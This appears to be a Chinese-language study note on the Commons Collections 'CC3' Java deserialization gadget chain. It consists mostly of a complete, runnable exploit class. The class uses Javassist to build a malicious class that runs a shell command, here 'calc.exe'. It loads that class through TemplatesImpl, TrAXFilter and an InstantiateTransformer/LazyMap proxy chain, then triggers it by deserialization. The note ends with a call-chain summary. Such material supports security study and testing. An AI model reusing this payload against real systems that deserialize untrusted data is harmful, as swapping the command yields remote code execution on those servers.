---
title: CC3链
date: 2026-03-23
updated: 2026-03-23
tags:
  - 链子
categories:
  - 链子
description: CC3链
published: true
---
```xml
<dependency>
    <groupId>org.javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.28.0-GA</version>
</dependency>
```

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC3Exp {

    public static void main(String[] args) throws Exception {

        // 利用 Javassist 动态生成恶意类的字节码 (木马)
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilClass");

        // TemplatesImpl 要求加载的类必须继承自 AbstractTranslet
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        // 在无参构造函数中插入恶意代码
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
        constructor.setBody("{ java.lang.Runtime.getRuntime().exec(\"calc.exe\"); }");
        ctClass.addConstructor(constructor);

        // 获取生成的字节码
        byte[] bytecodes = ctClass.toBytecode();

        // 构造 TemplatesImpl 实例，并将恶意字节码注入其中
        TemplatesImpl templates = new TemplatesImpl();

        // 通过反射设置私有属性
        setFieldValue(templates, "_bytecodes", new byte[][]{bytecodes});
        setFieldValue(templates, "_name", "EvilTemplates"); // 必须设置，否则会报错
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl()); // 必须设置

        // 构造 Transformer 链，完美避开 InvokerTransformer
        Transformer[] transformers = new Transformer[]{
                // 1. 返回 TrAXFilter 的 Class 对象
                new ConstantTransformer(TrAXFilter.class),
                // 2. 实例化 TrAXFilter，传入 templates 作为构造方法的参数
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 构造 LazyMap 和 动态代理 (与 CC1 LazyMap 完全一致)
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);

        InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                handler1
        );

        InvocationHandler handler2 = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        byte[] bytes = serialize(handler2);
        System.out.println("序列化完成，准备触发反序列化...");

        unserialize(bytes);
    }

    // 通过反射设置私有字段的值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void unserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```

前半部分 `readObject` -> `LazyMap::get` 和 CC1 LazyMap 一样。

这里的 `iParamTypes` 是 `{Templates.class}`，`iArgs` 是 `{templates}`

![[attachments/20260328160129.png]]

`TrAXFilter` 的构造方法接收一个 `Templates` 类型的参数，并且构造方法内部直接调用了参数的 `newTransformer()`

![[attachments/20260328160507.png]]

![[attachments/20260328160548.png]]

![[attachments/20260328160633.png]]

使用自定义类加载器加载恶意字节码

![[attachments/20260328160727.png]]

当 `_class[0].newInstance()` 被调用时，会执行通过 Javassist 插入的恶意代码

```java
// 恶意类的构造函数
public EvilClass() {
    java.lang.Runtime.getRuntime().exec("calc.exe");
}
```

利用 `TemplatesImpl` 动态加载并执行恶意的 Java 字节码。

```
ois.readObject() <=> ObjectInputStream.readObject()
AnnotationInvocationHandler::readObject()
	->Map(Proxy)::entrySet()
	->AnnotationInvocationHandler::invoke()
	->LazyMap::get()
	->ChainedTransformer::transform()
	->ConstantTransformer::transform()
	->InstantiateTransformer::transform()
	->TrAXFilter::<init>()                        // 调用构造方法
	->TemplatesImpl::newTransformer()
	->TemplatesImpl::getTransletInstance()
	->TemplatesImpl::defineTransletClasses()      // 加载恶意字节码为 Class
	->MaliciousClass::<init>()                    // 实例化恶意类，触发静态代码块/无参构造中的命令执行
```